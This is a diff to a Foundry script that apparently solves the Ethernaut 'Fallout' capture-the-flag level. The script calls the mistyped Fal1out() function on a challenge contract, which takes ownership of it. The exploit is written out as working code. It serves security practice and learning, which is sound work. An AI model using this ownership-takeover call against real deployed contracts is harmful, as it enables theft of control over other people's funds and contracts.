@@ -1,19 +1,19 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity 0.8.24;
 
-import "forge-std/Script.sol";
-import "../instances/Ilevel02.sol";
+import {Script} from "forge-std/Script.sol";
+import "../challenges/2_Fal1out.sol";
 
 contract POC is Script {
-    Fallout level2 = Fallout(0xDBDb61eF9B8422f67c2799Cd339840F2ba6f56cd);
+    Fallout fal1out = Fallout(0x74AeDd06d77592Fbf41dcd0fa39B04894DB78C52);
 
     function run() external {
-        vm.startBroadcast();
+        uint256 deployer = vm.envUint("PRIVATE_KEY");
 
-        console.log("Current Owner is: ", level2.owner());
-        level2.Fal1out();
-        console.log("New Owner is: ", level2.owner());
-        
+        vm.startBroadcast(deployer);
+
+        fal1out.Fal1out();
+
         vm.stopBroadcast();
     }
 }
